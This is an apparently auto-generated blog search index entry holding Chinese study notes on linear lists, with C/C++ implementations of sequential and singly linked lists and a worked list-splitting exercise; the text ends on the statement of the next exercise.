<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>02第二章、线性表</title>
    <url>/2021/05/15/02%E7%AC%AC%E4%BA%8C%E7%AB%A0%E3%80%81%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="第二章、线性表"><a href="#第二章、线性表" class="headerlink" title="第二章、线性表"></a>第二章、线性表</h1><h2 id="2-2-2-顺序表："><a href="#2-2-2-顺序表：" class="headerlink" title="2.2.2 顺序表："></a>2.2.2 顺序表：</h2><h3 id="算法库："><a href="#算法库：" class="headerlink" title="算法库："></a>算法库：</h3><h4 id="01-头文件-定义"><a href="#01-头文件-定义" class="headerlink" title="01 头文件+定义"></a>01 头文件+定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	ElemType data[MaxSize];<span class="comment">//元素</span></span><br><span class="line">	<span class="type">int</span> length;<span class="comment">//长度</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure>

<h4 id="02-建立与初始化"><a href="#02-建立与初始化" class="headerlink" title="02 建立与初始化"></a>02 建立与初始化</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*建立顺序表*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateList</span><span class="params">(SqList*&amp; L, ElemType a[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>, k = <span class="number">0</span>;<span class="comment">//k表示元素个数</span></span><br><span class="line">	L = (SqList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SqList));</span><br><span class="line">	<span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">		L-&gt;data[i] = a[i];</span><br><span class="line">		k++; i++;</span><br><span class="line">	&#125;</span><br><span class="line">	L-&gt;length = k;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList*&amp; L)</span> &#123;</span><br><span class="line">	L = (SqList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SqList));</span><br><span class="line">	L-&gt;length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="03-销毁、判空、长度、打印"><a href="#03-销毁、判空、长度、打印" class="headerlink" title="03 销毁、判空、长度、打印"></a>03 销毁、判空、长度、打印</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*销毁线性表*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DestroyList</span><span class="params">(SqList*&amp; L)</span> &#123;</span><br><span class="line">	<span class="built_in">free</span>(L);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*是否为空*/</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListEmpty</span><span class="params">(SqList* L)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> (L-&gt;length == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*返回长度*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListLength</span><span class="params">(SqList* L)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> (L-&gt;length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*打印线性表*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DispList</span><span class="params">(SqList* L)</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L-&gt;length; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, L-&gt;data[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="04-得到第-i-的元素"><a href="#04-得到第-i-的元素" class="headerlink" title="04 得到第 i 的元素"></a>04 得到第 i 的元素</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*得到第i的元素*/</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">GetElem</span><span class="params">(SqList* L, <span class="type">int</span> i, ElemType&amp; e)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L-&gt;length)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	e = L-&gt;data[i - <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="05-返回元素-e-的下标"><a href="#05-返回元素-e-的下标" class="headerlink" title="05 返回元素 e 的下标"></a>05 返回元素 e 的下标</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*返回元素e的下标*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">LocateElem</span><span class="params">(SqList* L, ElemType e)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (i &lt; L-&gt;length&amp;&amp; L-&gt;data[i] != e)</span><br><span class="line">		i++;</span><br><span class="line">	<span class="keyword">if</span> (i &gt;= L-&gt;length)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="06-在第-i-个位置插入元素"><a href="#06-在第-i-个位置插入元素" class="headerlink" title="06 在第 i 个位置插入元素"></a>06 在第 i 个位置插入元素</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*在第i个位置插入元素*/</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(SqList*&amp; L, <span class="type">int</span> i, ElemType e)</span> &#123;</span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	<span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L-&gt;length + <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	i--;</span><br><span class="line">	<span class="keyword">for</span> (j = L-&gt;length; j &gt; i; j--)</span><br><span class="line">		L-&gt;data[j] = L-&gt;data[j - <span class="number">1</span>];</span><br><span class="line">	L-&gt;data[i] = e;</span><br><span class="line">	L-&gt;length++;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="07-删除第-i-个元素"><a href="#07-删除第-i-个元素" class="headerlink" title="07 删除第 i 个元素"></a>07 删除第 i 个元素</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*删除第i个元素*/</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListDelete</span><span class="params">(SqList*&amp; L, <span class="type">int</span> i, ElemType e)</span> &#123;</span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	<span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L-&gt;length)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	i--;</span><br><span class="line">	e = L-&gt;data[i];</span><br><span class="line">	<span class="keyword">for</span> (j = i; j &lt; L-&gt;length - <span class="number">1</span>; j++)L-&gt;data[j] = L-&gt;data[j + <span class="number">1</span>];</span><br><span class="line">	L-&gt;length--;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="所有"><a href="#所有" class="headerlink" title="所有"></a>所有</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">	ElemType data[MaxSize];<span class="comment">//元素</span></span><br><span class="line">	<span class="type">int</span> length;<span class="comment">//长度</span></span><br><span class="line">&#125;SqList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*建立顺序表*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateList</span><span class="params">(SqList*&amp; L, ElemType a[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>, k = <span class="number">0</span>;<span class="comment">//k表示元素个数</span></span><br><span class="line">	L = (SqList*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SqList));</span><br><span class="line">	<span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">		L-&gt;data[i] = a[i];</span><br><span class="line">		k++; i++;</span><br><span class="line">	&#125;</span><br><span class="line">	L-&gt;length = k;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitList</span><span class="params">(SqList*&amp; L)</span> </span>&#123;</span><br><span class="line">	L = (SqList*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SqList));</span><br><span class="line">	L-&gt;length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*销毁线性表*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyList</span><span class="params">(SqList*&amp; L)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">free</span>(L);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*是否为空*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListEmpty</span><span class="params">(SqList* L)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (L-&gt;length == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*返回长度*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ListLength</span><span class="params">(SqList* L)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (L-&gt;length);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*打印线性表*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DispList</span><span class="params">(SqList* L)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L-&gt;length; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, L-&gt;data[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*得到第i的元素*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetElem</span><span class="params">(SqList* L, <span class="type">int</span> i, ElemType&amp; e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L-&gt;length)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	e = L-&gt;data[i - <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*返回元素e的下标*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LocateElem</span><span class="params">(SqList* L, ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (i &lt; L-&gt;length&amp;&amp; L-&gt;data[i] != e)</span><br><span class="line">		i++;</span><br><span class="line">	<span class="keyword">if</span> (i &gt;= L-&gt;length)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*在第i个位置插入元素*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListInsert</span><span class="params">(SqList*&amp; L, <span class="type">int</span> i, ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	<span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L-&gt;length + <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	i--;</span><br><span class="line">	<span class="keyword">for</span> (j = L-&gt;length; j &gt; i; j--)</span><br><span class="line">		L-&gt;data[j] = L-&gt;data[j - <span class="number">1</span>];</span><br><span class="line">	L-&gt;data[i] = e;</span><br><span class="line">	L-&gt;length++;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*删除第i个元素*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListDelete</span><span class="params">(SqList*&amp; L, <span class="type">int</span> i, ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	<span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L-&gt;length)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	i--;</span><br><span class="line">	e = L-&gt;data[i];</span><br><span class="line">	<span class="keyword">for</span> (j = i; j &lt; L-&gt;length - <span class="number">1</span>; j++)L-&gt;data[j] = L-&gt;data[j + <span class="number">1</span>];</span><br><span class="line">	L-&gt;length--;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	SqList* sqlist;</span><br><span class="line">	<span class="type">int</span> a[<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">InitList</span>(sqlist);</span><br><span class="line">	<span class="built_in">CreateList</span>(sqlist, a, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DispList</span>(sqlist);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-2-单链表"><a href="#2-3-2-单链表" class="headerlink" title="2.3.2 单链表"></a>2.3.2 单链表</h2><h3 id="算法库"><a href="#算法库" class="headerlink" title="算法库"></a>算法库</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">LNode</span>&#123;</span><br><span class="line">	ElemType data;<span class="comment">//元素</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">LNode</span>* next;</span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*头插法*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateListF</span><span class="params">(LinkNode *&amp;L,ElemType a[],<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">	LinkNode* s;</span><br><span class="line">	L = (LinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LinkNode));</span><br><span class="line">	L-&gt;next = <span class="literal">NULL</span>;<span class="comment">//建立头节点，将next域置为null</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++) &#123;<span class="comment">//循环建立数据节点s</span></span><br><span class="line">		s = (LinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LinkNode));</span><br><span class="line">		s-&gt;data = a[i];<span class="comment">//数据存入</span></span><br><span class="line">		s-&gt;next = L-&gt;next;<span class="comment">//将节点s的next是L的next，sn-&gt;ln</span></span><br><span class="line">		L-&gt;next = s;<span class="comment">//节点L的nest是s，ln-&gt;s</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*尾插法*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateListR</span><span class="params">(LinkNode*&amp; L, ElemType a[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">	LinkNode* s,*r;</span><br><span class="line">	L = (LinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LinkNode));<span class="comment">//创建头节点</span></span><br><span class="line">	r = L;<span class="comment">//r始终指向尾节点，初始是指向头节点</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;<span class="comment">//循环建立数据节点</span></span><br><span class="line">		s = (LinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LinkNode));</span><br><span class="line">		s-&gt;data = a[i];<span class="comment">//存入</span></span><br><span class="line">		r-&gt;next = s;<span class="comment">//将节点s插入到节点r之后,r指向尾节点</span></span><br><span class="line">		r = s;<span class="comment">//尾巴后面插元素，然后尾巴移到后一个元素，保证r始终是尾巴</span></span><br><span class="line">	&#125;</span><br><span class="line">	r-&gt;next = <span class="literal">NULL</span>;<span class="comment">//为节点的next置为null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*初始化线性表*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitList</span><span class="params">(LinkNode *&amp;L)</span> </span>&#123;</span><br><span class="line">	L = (LinkNode *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LinkNode));</span><br><span class="line">	L-&gt;next = <span class="literal">NULL</span>;<span class="comment">//指向null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*销毁线性表*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyList</span><span class="params">(LinkNode*&amp;L)</span> </span>&#123;</span><br><span class="line">	LinkNode* pre = L, * p = L-&gt;next;</span><br><span class="line">	<span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">free</span>(pre);<span class="comment">//销毁节点，从头结点开始</span></span><br><span class="line">		pre = p;</span><br><span class="line">		p = pre-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(pre);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*判断是否是空*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListEmpty</span><span class="params">(LinkNode *L)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> L-&gt;next == <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*求长度*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ListLength</span><span class="params">(LinkNode *L)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">	LinkNode* p = L;</span><br><span class="line">	<span class="keyword">while</span> (p-&gt;next!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		n++;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*打印单链表*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DispList</span><span class="params">(LinkNode* L)</span> </span>&#123;</span><br><span class="line">	LinkNode* p = L-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (p!= <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,p-&gt;data);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*求第i个位置的元素值*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetElem</span><span class="params">(LinkNode *L,<span class="type">int</span> i,ElemType &amp;e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	LinkNode* p = L;</span><br><span class="line">	<span class="keyword">if</span> (i &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &lt; i &amp;&amp; p != <span class="literal">NULL</span>) &#123;<span class="comment">//移动到位置i</span></span><br><span class="line">		j++;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		e = p-&gt;data;<span class="comment">//得到</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*按元素值查找，得到下标*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LocateElem</span><span class="params">(LinkNode *L,ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">	LinkNode* p = L-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data!=e) &#123;<span class="comment">//移到对应元素值</span></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*在第i个位置插入元素e*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListInsert</span><span class="params">(LinkNode *&amp;L,<span class="type">int</span> i,ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	LinkNode* p = L, * s;</span><br><span class="line">	<span class="keyword">if</span> (i &lt;= <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &lt;i<span class="number">-1</span> &amp;&amp; p!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		j++;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		s = (LinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LinkNode));</span><br><span class="line">		s-&gt;data = e;</span><br><span class="line">		s-&gt;next = p-&gt;next;<span class="comment">//头插法</span></span><br><span class="line">		p-&gt;next = s;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*删除单链表下标i的元素，并返回*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListDelete</span><span class="params">(LinkNode*&amp; L, <span class="type">int</span> i, ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	LinkNode* p = L, * q;</span><br><span class="line">	<span class="keyword">if</span> (i &lt;= <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &lt; i - <span class="number">1</span> &amp;&amp; p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		j++;<span class="comment">//移动指针</span></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		q = p-&gt;next;</span><br><span class="line">		<span class="keyword">if</span> (q == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		e = q-&gt;data;</span><br><span class="line">		p-&gt;next = q-&gt;next;<span class="comment">//p-&gt;next=p-&gt;next-&gt;next;</span></span><br><span class="line">		<span class="built_in">free</span>(q);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例题-2-6-奇偶分配"><a href="#例题-2-6-奇偶分配" class="headerlink" title="例题 2.6 奇偶分配"></a>例题 2.6 奇偶分配</h3><p>[例2.6]有一个带头结点的单链表L&#x3D;(a1,b1,a2,b2,…,an,bn)，设计一个算法将其拆分成两个带头结点的单链表L1和L2，其中L1&#x3D;(a1,a2,…,an),L2&#x3D;(bn,b(n-1),…,b1),要求L1使用L的头结点。<br>解：利用原单链表L中的所有结点通过改变指针域重组成两个单链表L1和L2。由于L1中结点的相对顺序与L中的相同，所以采用尾插法建立单链表L1；由于L2中结点的相对顺序与L中的相反，所以采用头插法建立单链表L2。算法如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*L1顺序奇数，L2逆序偶数*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">split</span><span class="params">(LinkNode *&amp;L,LinkNode *&amp;L1,LinkNode *&amp;L2)</span> </span>&#123;</span><br><span class="line">	LinkNode* p = L-&gt;next, * q, * r1;<span class="comment">//p指向第一个数据节点</span></span><br><span class="line">	L1 = L;<span class="comment">//L1利用原来L的头节点</span></span><br><span class="line">	r1 = L1;<span class="comment">//r1指向L1尾节点</span></span><br><span class="line">	L2 = (LinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LinkNode));<span class="comment">//创建L2</span></span><br><span class="line">	L2-&gt;next = <span class="literal">NULL</span>;<span class="comment">//null</span></span><br><span class="line">	<span class="keyword">while</span> (p!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		r1-&gt;next = p;  <span class="comment">//尾插法将*p（ai）插入L1中</span></span><br><span class="line">		r1 = p;</span><br><span class="line">		p = p-&gt;next;  <span class="comment">//下移动</span></span><br><span class="line">		q = p-&gt;next;  <span class="comment">//因为头插法会修改指针域，所以用q保存p的后继节点</span></span><br><span class="line">		p-&gt;next = L2-&gt;next;<span class="comment">//p插在L2前面</span></span><br><span class="line">		L2-&gt;next = p;</span><br><span class="line">		p = q;   <span class="comment">//p重新指向ai+1的节点</span></span><br><span class="line">	&#125;</span><br><span class="line">	r1-&gt;next = <span class="literal">NULL</span>;  <span class="comment">//尾巴节点置空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例题-2-7-删除最大节点"><a href="#例题-2-7-删除最大节点" class="headerlink" title="例题 2.7 删除最大节点"></a>例题 2.7 删除最大节点</h3><p>[例2.7]设计一个算法，删除一个单链表L中元素值最大的结点（假设这样的结点唯一）</p>
